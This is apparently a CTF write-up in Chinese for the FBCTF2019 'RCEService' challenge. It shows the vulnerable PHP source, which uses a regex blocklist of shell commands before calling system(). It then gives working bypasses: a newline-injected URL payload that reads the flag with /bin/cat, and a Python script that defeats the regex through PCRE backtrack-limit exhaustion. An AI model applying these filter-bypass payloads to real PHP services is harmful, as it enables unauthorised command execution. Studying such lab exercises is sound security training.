---
title: FBCTF2019 RCEService
date: 2021-03-31 23:31:12
tags: wp

---
## 'o'  'o'   

![](https://ftp.bmp.ovh/imgs/2021/03/4d9c90c2ba9a44e4.png) 
命令执行      
ls一下，用JSON格式：`{"cmd":"ls"}`      
得到一个`index.php`      
除此之外，输入其他命令会报错，过滤了    

看WP都直接给出的源码，也不知道哪来的`‘？’`       



	```php
	<?php
	
	putenv('PATH=/home/rceservice/jail');
	
	if (isset($_REQUEST['cmd'])) {
	  $json = $_REQUEST['cmd'];
	
	  if (!is_string($json)) {
	    echo 'Hacking attempt detected<br/><br/>';
	  } elseif (preg_match('/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/', $json)) {
	    echo 'Hacking attempt detected<br/><br/>';
	  } else {
	    echo 'Attempting to run command:<br/>';
	    $cmd = json_decode($json, true)['cmd'];
	    if ($cmd !== NULL) {
	      system($cmd);
	    } else {
	      echo 'Invalid input';
	    }
	    echo '<br/><br/>';
	  }
	}
	
	?>
	```



`putenv — 设置环境变量的值`       
设置了环境变量，但可以ls，是因为路径下有ls的二进制文件        
`%0a`绕过`preg_match`       
`?cmd={%0A"cmd"%3A"ls+%2Fhome%2Frceservice"%0A}`直接在URL中输入，表单提交的话`%0a`会被再次编码，出不来          
![](https://ftp.bmp.ovh/imgs/2021/03/67a2d29f30e10e8a.png)     
cat没法用，可以用绝对路径`/bin/cat`      
`?cmd={%0A"cmd"%3A"/bin/cat+%2Fhome%2Frceservice/flag"%0A}`          

<strong>回溯绕过</strong>     

[P神：PHP利用PCRE回溯次数限制绕过某些安全限制](https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html#0x03-phppcrebacktrack_limit)        



	```python
	import requests
	
	payload = '{"cmd":"/bin/cat /home/rceservice/flag","test":"' + "a"*(1000000) + '"}'
	res = requests.post("http://0c2928b7-761f-4fac-be5e-291db6ec5085.node3.buuoj.cn/", data={"cmd":payload})
	#print(payload)
	print(res.text)
	```


